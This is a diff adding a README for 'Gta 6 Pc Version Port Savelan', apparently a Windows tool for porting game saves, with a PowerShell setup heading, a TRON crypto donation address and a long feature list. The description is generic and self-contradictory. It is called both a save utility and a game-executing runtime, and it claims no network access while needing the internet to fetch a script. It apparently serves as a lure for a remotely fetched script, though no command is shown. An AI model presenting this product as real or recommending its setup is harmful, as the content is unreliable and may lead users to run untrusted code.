@@ -1,0 +1,84 @@
+Gta 6 Pc Version Port Savelan - Feature-Driven Windows Desktop Client
+
+🖥️ PowerShell Setup
+
+Support this project
+
+TRON:&nbsp;THYd9GU1WBsVsibX3R3HUam6Hnqv4v2SEr
+
+Gta 6 Pc Version Port Savelan is a desktop software utility engineered to manage and port save data for the GTA 6 PC version. It provides deterministic save-file parsing, version-aware migration, and integrity validation across supported game builds. The application exposes configurable profiles, batch conversion, and automated backup handling for reliable save transfer workflows. Built for technical users, it emphasizes data fidelity, repeatable operations, and clear diagnostic output during every porting task.
+
+📋 System Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- Native desktop port of the GTA 6 PC Version Port Savelan, implemented as a standalone application with no external runtime dependencies.
+- Save-state serialization engine that captures full game state, including player position, inventory, mission progress, and world flags, into versioned save files.
+- Deterministic save/load routines designed to preserve state integrity across sessions and application restarts.
+- Multi-slot save management with per-slot metadata, timestamps, and integrity checksums to detect corruption.
+- Atomic write strategy for save files, using temporary buffers and staged commits to prevent partial writes during interruption.
+- Configurable save directory and profile separation, allowing multiple independent save sets on a single machine.
+- Structured logging subsystem with adjustable verbosity levels for diagnosing load and save operations.
+- Cross-session compatibility layer that validates save schema versions and applies migration routines when loading older files.
+- Low-overhead runtime hooks that integrate with the port's memory model without altering core gameplay behavior.
+- Headless operation mode for batch validation and save-file inspection outside the main application window.
+- Command-line interface for scripting save operations, listing slots, and exporting diagnostics.
+- Built-in integrity verification tool that scans save files and reports structural inconsistencies.
+- Modular architecture separating the save engine, storage backend, and UI layer for maintainability and extension.
+- Portable file format design that remains stable across application updates and platform builds.
+
+How it works
+
+Gta 6 Pc Version Port Savelan operates as a self-contained desktop runtime that recompiles and executes game content through a compatibility translation layer, avoiding any dependency on the original console hardware or platform services. On launch, the application scans the configured content directory, indexes available asset packages, and validates their integrity against an internal manifest before any runtime initialization occurs.
+
+The core pipeline is divided into four stages. First, a content resolver maps asset archives to virtual filesystem mount points, decoupling game data from platform-specific storage paths. Second, a translation layer intercepts platform calls and reroutes them to native desktop APIs, handling input, audio, graphics, and timing subsystems through configurable backends. Third, a runtime scheduler manages frame pacing, asynchronous asset streaming, and resource lifetimes to keep memory usage bounded during extended sessions. Fourth, a state manager serializes session data, settings, and progress into portable checkpoint files that can be moved between machines without reconfiguration.
+
+Configuration is handled through a versioned settings schema. On first run, the application performs hardware detection and selects conservative defaults for rendering backend, texture cache size, and streaming budget; these values are persisted and can be overridden per profile. Profiles are isolated, allowing multiple independent configurations to coexist on the same installation.
+
+Logging and diagnostics are built into every stage. Each subsystem emits structured log events with severity levels, and the application maintains a rolling diagnostic buffer that can be exported for inspection. Runtime errors are contained at the subsystem boundary where possible, allowing the application to degrade gracefully rather than terminate.
+
+The application is stateless with respect to external services: all processing, validation, and state persistence occur locally on the host machine, and no network access is required for normal operation. Updates to the port are applied as complete, versioned runtime bundles, with the application verifying bundle signatures and reconciling schema migrations on startup before the runtime becomes available.
+
+Modules and Settings
+
+Save Slot Inspector
+This module provides the initial read-only view of a save container so the user can decide what to port before touching any data.
+- Slot list shows each entry with its identifier, timestamp and reported size, and supports side-by-side comparison of two selected slots.
+- Selection actions mark slots for export or removal, with the current selection carried forward to the transfer and batch modules.
+- Read-only mode is the entry point that feeds verified slot information into every later operation, so nothing is written until the user confirms.
+
+Version Mapping and Conversion
+This module handles the actual port between a save and a target PC build profile, and it is where the conversion behaviour chosen elsewhere is applied.
+- Mapping mode chooses between strict handling that halts on unknown fields and tolerant handling that carries unrecognized data forward unchanged.
+- Target build profile selection associates the incoming save with the PC release environment being ported to.
+- After conversion the user gets a converted copy plus a summary of mapped, skipped and retained entries, which can be sent straight into Integrity Verification for comparison against the input.
+
+Slot Transfer
+This module moves selected slots from a source save into a destination save without replacing the destination file.
+- Occupancy view for both source and destination makes free and used slots visible before the transfer begins.
+- Overwrite or append behaviour determines whether an occupied destination slot is replaced or a new position is used.
+- In-use warnings appear when a destination slot is already occupied, and the result keeps the destination file's other original contents intact.
+
+Restore Points
+This module supplies the rollback path that backs every write performed by the conversion, transfer and metadata modules.
+- A restore point is recorded automatically before any write operation, and additional named restore points can be created on demand.
+- The restore point list shows creation time and the operation that triggered each entry.
+- Restoring an entry returns the save to that exact recorded state, so a conversion or transfer can be undone without manual repair.
+
+Integrity Verification
+This module checks a save for structural problems, and its report gates whether a porting operation should proceed.
+- A verification pass reports truncated sections, malformed entries and checksum mismatches as a per-region report with pass, warning and failure markers.
+- On a file that raises warnings the user decides whether to continue with porting, so the verification result feeds directly into the conversion and transfer decisions.
+- The same check can be run on a converted output to compare it against the input file.
+
+Metadata Editor
+This module changes the editable metadata fields a save exposes while leaving gameplay data untouched.
+- Form fields for profile labels and slot naming validate each entry before it is applied.
+- A change summary preview can be reviewed before committing, and individual fields can be reverted without discarding the whole edit set.
+
+…（内容已截断）
